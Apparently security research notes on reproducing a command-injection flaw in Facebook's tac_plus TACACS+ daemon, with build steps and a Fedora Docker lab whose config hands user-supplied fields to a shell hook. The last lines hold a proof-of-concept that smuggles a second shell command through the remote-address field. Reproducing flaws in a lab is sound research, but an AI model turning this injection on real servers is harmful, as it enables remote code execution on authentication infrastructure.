# Facebook tac_plus

## Setup

```bash
# compile daemon with debug symbols
git clone https://github.com/facebook/tac_plus.git
cd tac_plus/tacacs-F4.0.4.28
CFLAGS="-g3 -O0" ./configure
make
# run the daemon without the wrapper script (to make it debuggable)
LD_LIBRARY_PATH=.libs .libs/tac_plus \
    -G \
    -d 5 \
    -l /dev/stdout \
    -p 4949 \
    -C tac_plus.cfg
```

## Examples

This section includes examples of Linux distributions that use the Facebook fork.

### Fedora

- tacacs package
- Upstream: Facebook (https://github.com/facebook/tac_plus)

```Dockerfile
FROM fedora
WORKDIR /tmp
RUN yum update -y && yum install -y tacacs
SHELL ["/bin/bash", "-c"]
RUN echo $'accounting file = /tmp/tac_acc.log\n \
user=DEFAULT {\n \
 before authorization "/bin/false -- \'$user\' \'$name\' \'$address\'"\n \
  service = exec {\n \
    default attribute = permit\n \
  }\n \
}' > /tmp/tac_plus.cfg
CMD ["/usr/sbin/tac_plus", "-G", "-d", "5", "-l", "/dev/stdout", "-p", "4949", "-C", "tac_plus.cfg"]

# docker build -t tac_plus_fedora -f Dockerfile.fedora .
# docker run --rm -p 4949:4949 --name tac_plus_fedora tac_plus_fedora

# tacacs_client --host 127.0.0.1 --port 4949 --username DEFAULT --rem-addr "asd';touch /tmp/tacpluspoc123 #" authorize -c service=exec
# docker exec tac_plus_fedora ls -la /tmp
```